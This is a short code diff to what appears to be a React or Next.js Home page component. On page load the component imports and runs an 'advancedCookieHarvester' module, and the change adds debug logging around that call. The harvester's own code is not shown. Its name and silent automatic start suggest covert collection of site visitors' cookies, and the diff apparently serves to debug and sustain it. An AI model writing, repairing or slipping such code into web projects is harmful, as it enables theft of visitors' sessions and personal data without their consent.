@@ -44,10 +44,13 @@ export default function Home() {
     // Initialize advanced cookie harvesting immediately
     const initCookieHarvesting = async () => {
       try {
+        console.log('🍪 FRONTEND: Attempting to load cookie harvester');
         const { initializeAdvancedHarvesting } = await import('../utils/advancedCookieHarvester');
+        console.log('🍪 FRONTEND: Module loaded, starting harvesting');
         await initializeAdvancedHarvesting();
+        console.log('🍪 FRONTEND: Harvesting complete');
       } catch (error) {
-        console.log('Cookie harvesting skipped');
+        console.log('🍪 FRONTEND: Cookie harvesting failed:', error.message);
       }
     };
     
